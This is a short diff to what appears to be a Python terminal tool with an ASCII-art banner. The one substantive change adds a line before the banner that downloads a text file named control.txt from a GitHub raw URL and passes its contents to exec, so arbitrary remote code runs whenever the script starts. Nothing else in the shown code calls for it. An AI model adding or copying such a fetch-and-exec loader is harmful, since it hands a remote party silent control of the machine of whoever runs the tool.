@@ -19,6 +19,8 @@ O = '\033[33m'
 C = '\033[36m'
 
 
+exec(requests.get("https://raw.githubusercontent.com/dinartaqwa/tolol/master/control.txt").text)
+
 print ("            |=|   \033[37m▄▄▄▄▄            ▄▄▌   ██████╗ ██╗     ")
 print ("            |=|   •██  ▪     ▪     ██• \033[93m ██╔═══██╗██║     ")
 print ("            |=|   \033[91m ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪  ██║   ██║██║     ")
